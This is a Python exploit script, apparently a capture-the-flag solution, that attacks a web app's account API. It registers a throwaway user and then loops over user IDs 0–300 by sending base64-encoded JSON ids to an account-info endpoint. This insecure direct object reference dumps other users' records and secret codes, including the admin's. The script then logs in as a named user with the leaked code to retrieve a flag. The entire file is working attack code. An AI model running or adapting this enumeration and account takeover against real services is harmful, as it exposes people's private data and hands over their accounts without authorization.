import httpx 
import sys 
import random
import string
import base64
import json

def generate_creds():
    username = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    lastname = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    firstname = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    return username, lastname, firstname

def register(client: httpx.Client) -> str:
    username, firstName, lastName = generate_creds()

    data = {
        "username": username, 
        "lastName": lastName, 
        "firstName": firstName
    }

    r = client.post("/api/register", json=data)
    assert r.is_success, "[!] Registration failed"
    return username, r.json()['secretCode']

def login(client: httpx.Client, username: str, secretCode: str) -> None:
    data = {
        "username": username, 
        "secretCode": secretCode
    }

    r = client.post("/api/login", json=data)
    assert r.is_success, f"Login failed: {r.text}"
    
    session_cookie = r.cookies.get('session')
    
    if "flag" in r.json():
        print(f"[*] Flag: {r.json()['flag']}")

    return r.json()['id'], session_cookie

def IDOR(client: httpx.Client, id: int, session_cookie: str) -> str:
    payload = json.dumps({
        "id": id
    })
    payload_b64 = base64.b64encode(payload.encode()).decode() 
    
    headers = {
        'Cookie': f'session={session_cookie}'
    }
    
    r = client.get(f"/api/account_info/{payload_b64}", headers=headers)
    assert r.is_success, f"Request failed: {r.text}"
    return r.json()

def exploit(ip: str):
    BASE_URL = f"{ip}"
    client = httpx.Client(
        base_url=BASE_URL,
        verify=False,
        follow_redirects=True,
    )

    username, secretCode = register(client)
    user_id, session_cookie = login(client, username, secretCode)
    print(f"[*] Logged in as {username} with ID {user_id}")

    
    for i in range(301):
        try:
            result = IDOR(client, i, session_cookie)
            if result['username']:
                if result['username'] == "admin":
                    print(f"[*] Leaked admin ID {i}:", result)
                else:
                    print(f"[*] Leaked ID {i}:", result)
                
                if result['username'] == "icvorovic":
                    login(client, result['username'], result['secret_code'])
                     

        except Exception as e:
            pass

if __name__ == "__main__":
    TARGET_IP = sys.argv[1] if len(sys.argv) > 1 else "http://0.0.0.0:3000"
    exploit(TARGET_IP)